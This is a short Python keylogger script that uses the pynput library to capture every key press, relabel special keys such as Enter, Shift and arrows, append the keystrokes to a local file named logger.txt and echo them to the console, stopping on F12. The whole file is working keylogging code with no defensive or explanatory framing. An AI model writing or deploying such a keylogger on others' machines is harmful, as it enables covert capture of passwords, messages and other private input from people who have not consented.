# -*- coding: utf-8 -*-
import regex
import string
from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l":
        key = " (CRT)"
    if key == "Key.ctrl_r":
        key = " (CRT)"
    if key == "Key.enter":
        key = " (ENTER) "
    if key == "Key.tab":
        key = " *** " 
    if key == "Key.alt_l":
        key = " *** "
    if key == "Key.alt_r":
        key = " *** "
    if key == "Key.backspace":
        key = " (dl<-)"
    if key == "Key.delete":
        key = " (dl->)"
    if key == "Key.space":
        key = " "
    if key == "Key.caps_lock":
        key = " (CAPS)"
    if key == "Key.shift_r":
       key = " (SHIFT)"
    if key == "Key.shift":
       key = " (SHIFT)"
    if key == "Key.right":
       key = "(→)"
    if key == "Key.left":
       key = "(←)"
    if key == "Key.down":
       key = "(↓)"
    if key == "Key.up":
       key = "(↑)"
    if key == "Key.esc":
       key = "(ESC) "

    with open("logger.txt", "a", encoding='utf-8') as file:
        file.write(key)
    print(key)
with Listener(on_press=anonymous) as listener:
    listener.join()














